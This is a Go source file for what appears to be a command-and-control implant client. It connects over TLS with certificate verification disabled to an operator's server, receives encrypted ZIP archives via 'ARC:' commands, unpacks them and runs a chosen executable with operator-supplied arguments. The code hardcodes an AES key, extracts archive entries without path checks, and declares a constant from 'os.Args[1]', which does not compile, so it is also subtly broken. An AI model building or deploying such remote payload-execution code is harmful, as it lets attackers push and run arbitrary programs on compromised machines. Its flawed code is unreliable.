package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	serverAddr = os.Args[1]                         //"192.168.1.20:443"                 // adjust as needed
	password   = "thisis32bitlongpassphraseimusing" // 32-byte key for AES-256
)

func main() {
	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		log.Fatalf("client: dial error: %v", err)
	}
	defer conn.Close()
	log.Printf("client: connected to %v", serverAddr)

	reader := bufio.NewReader(conn)
	for {
		// Read one complete instruction message terminated by newline.
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("client: read error: %v", err)
			break
		}
		message = strings.TrimSpace(message)
		if message == "" {
			continue
		}
		response := handleCommand(message)
		// Send the response back to the server.
		_, err = conn.Write([]byte(response + "\n"))
		if err != nil {
			log.Printf("client: write error: %v", err)
			break
		}
	}
}

func handleCommand(command string) string {
	// We support the ARC: command in this client.
	if strings.HasPrefix(command, "ARC:") {
		// Expected format: ARC:<exeName>:<arguments>:<hexData>
		parts := strings.SplitN(command, ":", 4)
		if len(parts) != 4 {
			return "Invalid ARC command format"
		}
		exeName := parts[1]
		exeArgs := parts[2]
		encryptedHex := parts[3]
		data, err := decryptData(encryptedHex)
		if err != nil {
			return fmt.Sprintf("Error decrypting archive: %v", err)
		}
		// Process archive and run the specified executable.
		err = handleArchive(data, exeName, exeArgs)
		if err != nil {
			return fmt.Sprintf("Error processing archive: %v", err)
		}
		return "Archive processed and executable ran successfully"
	}
	// For other commands (e.g., CMD: or MEM:), return a default message.
	return "Unknown command"
}

// decryptData decodes a hex string and decrypts its payload using AES-GCM.
func decryptData(hexData string) ([]byte, error) {
	cleanHex := strings.TrimSpace(hexData)
	encryptedData, err := hex.DecodeString(cleanHex)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher([]byte(password))
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// handleArchive extracts the ZIP archive from data into a temporary folder,
// changes the working directory to that folder, and then executes the specified binary.
func handleArchive(data []byte, exeName, args string) error {
	extractDir, err := extractArchive(data)
	if err != nil {
		return err
	}
	// Build the full path of the executable inside the extracted directory.
	exePath := filepath.Join(extractDir, exeName)
	// Run the tool and set its working directory to the extraction folder.
	return runTool(exePath, args, extractDir)
}

// extractArchive extracts the provided ZIP archive data into a temporary folder.
func extractArchive(data []byte) (string, error) {
	tmpDir, err := ioutil.TempDir("", "extracted_archive")
	if err != nil {
		return "", err
	}
	reader, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return "", err
	}
	for _, file := range reader.File {
		path := filepath.Join(tmpDir, file.Name)
		if file.FileInfo().IsDir() {
			os.MkdirAll(path, file.Mode())
			continue
		}
		err = func() error {
			fileReader, err := file.Open()
			if err != nil {
				return err
			}
			defer fileReader.Close()
			// Create the file at the target location.
			targetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())
			if err != nil {
				return err
			}
			defer targetFile.Close()
			_, err = io.Copy(targetFile, fileReader)
			return err
		}()
		if err != nil {
			return "", err
		}
	}
	return tmpDir, nil
}

// runTool executes the specified executable (exePath) with the given arguments,
// setting the working directory to workDir so that relative paths work correctly.
func runTool(exePath, args, workDir string) error {
	cmd := exec.Command(exePath, strings.Fields(args)...)
	cmd.Dir = workDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Error: %v, Output: %s", err, output)
	}
	fmt.Printf("Output: %s\n", output)
	return nil
}
